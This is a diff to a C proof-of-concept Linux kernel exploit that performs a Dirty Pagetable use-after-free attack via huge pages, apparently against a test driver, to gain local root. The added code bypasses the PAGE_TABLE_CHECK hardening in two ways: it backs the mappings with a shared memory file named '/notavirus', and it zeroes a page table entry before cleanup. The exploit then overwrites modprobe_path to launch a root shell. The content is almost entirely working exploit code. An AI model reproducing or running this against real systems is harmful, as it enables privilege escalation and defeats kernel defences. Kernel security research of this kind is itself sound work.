@@ -9,8 +9,12 @@
  *   - CONFIG_SLAB_BUCKETS
  *   - CONFIG_RANDOM_KMALLOC_CACHES
  *
+ * (they don't break the implemented Dirty Pagetable attack)
+ *   - CONFIG_PAGE_TABLE_CHECK
+ *   - CONFIG_TRANSPARENT_HUGEPAGE
+ * 
  * This PoC performs the Dirty Pagetable attack via huge pages and gains LPE.
- *
+ * 
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
  *  2) Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel
@@ -129,16 +133,32 @@ int prepare_page_tables(void)
 {
 	unsigned long *addr = NULL;
 	long i = 0;
+	int fd;
 
 	printf("[!] preparing page tables\n");
 
+	/*
+	 * We use the SHM file to freeze the memory once the PoC is finished.
+	 * This allows us to bypass PAGE_TABLE_CHECK hardening when data is freed.
+	 * Since the file exists after finishing, we never reach the page refcount check.
+	 */
+	fd = shm_open("/notavirus", O_CREAT | O_RDWR, 0666);
+	if (fd < 0) {
+		perror("shm_open");
+		return EXIT_FAILURE;
+	}
+
+	if (ftruncate(fd, PAGE_SIZE) < 0) {
+		perror("ftruncate");
+		return EXIT_FAILURE;
+	}
 	/*
 	 * Prepare the resources for PUD that will later reclaim
 	 * the freed slab containing UAF object.
 	 */
 	for (i = 0; i < PT_ENTRIES; i++) {
 		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
-			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+			    MAP_FIXED | MAP_SHARED, fd, 0);
 		if (addr == MAP_FAILED) {
 			perror("[-] mmap");
 			return EXIT_FAILURE;
@@ -585,7 +605,7 @@ int main(void)
 				phys_addr += PUD_SIZE;
 				ret = pud_write(phys_addr, uaf_n, act_fd);
 				if (ret == EXIT_FAILURE)
-					goto end;
+					goto repair;
 			}
 
 			/*
@@ -598,12 +618,12 @@ int main(void)
 		}
 
 		if (modprobe_path_uaddr == NULL)
-			break;
+			goto repair;
 
 		new_len = strlen(privesc_script_path);
 		if (new_len + 1 > KMOD_PATH_LEN) {
 			printf("[-] not enough bytes in modprobe_path\n");
-			break;
+			goto repair;
 		}
 
 		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
@@ -612,6 +632,16 @@ int main(void)
 		/* Launch the root shell */
 		trigger_modprobe_sock();
 		result = EXIT_SUCCESS;
+
+repair:
+		/* 
+		 * Bypass the PAGE_TABLE_CHECK hardening when the page table is freed.
+		 * To do so, we fill the page table entry with zeroes to skip memory freeing
+		 * in do_zap_pte_range() (see pte_none()).
+		 * This ensures that the page_table_check function is never reached for that entry
+		 */
+		act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");
+
 		goto end; /* root shell is finished */
 	}
 
